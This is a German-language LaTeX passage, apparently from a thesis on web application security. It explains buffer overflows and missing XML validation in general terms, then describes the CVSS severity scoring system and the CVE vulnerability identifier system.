Angreifer verwenden Pufferüberläufe, um den Ausführungsstapel (engl. execution stack) einer Webanwendung zu beschädigen. Durch das Senden sorgfältig ausgearbeiteter Eingaben an eine Webanwendung kann ein Angreifer die Ausführung von beliebigem Code durch die Webanwendung veranlassen, sodass die Maschine effektiv übernommen wird. Fehler beim Pufferüberlauf können sowohl auf dem Webserver als auch auf den Anwendungsserverprodukten vorhanden sein, die den statischen und dynamischen Aspekten der Website oder der Webanwendung selbst dienen. Pufferüberläufe, die in weit verbreiteten Serverprodukten gefunden werden, werden wahrscheinlich allgemein bekannt und können ein erhebliches Risiko für die Benutzer dieser Produkte darstellen. Wenn Webanwendungen Bibliotheken verwenden, z. B. eine Grafikbibliothek, um Bilder zu generieren, öffnen sie sich für die potenziellen Pufferüberlaufangriffen. Pufferüberläufe können auch in benutzerdefiniertem Webanwendungscode gefunden werden. Dies ist möglicherweise sogar der Fall, wenn die Webanwendungen nicht sorgfältig geprüft werden. 

Pufferüberläufe führen in der Regel zu Abstürzen. Außerdem können Pufferüberläufe häufig zur Ausführung von beliebigem Code verwendet werden, der normalerweise außerhalb der impliziten Sicherheitsrichtlinien eines Programms liegt\cite{bufferoverflow16}.\\

\subsubsection{Fehlende XML-Validierung (engl. Missing XML Validation)}

Wenn die Validierung beim Analysieren von XML nicht aktiviert wird, kann ein Angreifer böswillige Eingaben bereitstellen. Die meisten erfolgreichen Angriffe beginnen mit einer Verletzung der Annahmen des Programmierers. Durch die Annahme eines XML-Dokuments, ohne es anhand eines XML-Schemas zu überprüfen, lässt der Programmierer Angreifern die Tür auf, um unerwartete, unvernünftige oder böswillige Eingaben bereitzustellen\cite{bufferoverflow16}.\\ 

\subsection{Common Vulnerability Scoring System (CVSS)}

Das Common Vulnerability Scoring System (CVSS) ist ein Framework zur Bewertung des Schweregrads von Sicherheitslücken in Software. Das CVSS wird vom Forum of Incident Response und Security Teams (FIRST) betrieben und verwendet einen Algorithmus, um drei Bewertungsgrade für den Schweregrad zu bestimmen wie z.B. Basis, Zeit und Umwelt. Die Bewertungen sind numerisch und sie reichen von 0,0 bis 10,0, wobei 10,0 am schwerwiegendsten ist. Mit dem CVSS können Organisationen Prioritäten festlegen, welche Schwachstellen zuerst behoben werden müssen, und die Auswirkungen der Schwachstellen auf ihre Systeme abschätzen. Viele Organisationen verwenden den CVSS, und die National Vulnerability Database (NVD) bietet Bewertungen für die meisten bekannten Sicherheitsanfälligkeiten. Gemäß der NVD wird ein CVSS-Basiswert von 0,0-3,9 als "`niedrig"' eingestuft; Ein CVSS-Basiswert von 4,0 bis 6,9 ist der Schweregrad "`Mittel"'. Der Basiswert von 7.0-10.0 ist der Schweregrad "`Hoch"'\cite{cvss16}.\\

\subsection{Common Vulnerabilities and Exposures (CVE)}

Das Common Vulnerabilities and Exposures (CVE)-System identifiziert alle Schwachstellen und Bedrohungen, die mit der Sicherheit von Informationssystemen zusammenhängen. Zu diesem Zweck wird jeder Schwachstelle ein eindeutiger Bezeichner zugewiesen. Ziel ist es, ein Wörterbuch zu erstellen, das alle Schwachstellen auflistet und jeweils eine kurze Beschreibung sowie eine Reihe von Links enthält, die Benutzer für weitere Details anzeigen können\cite{cve18}.\\
















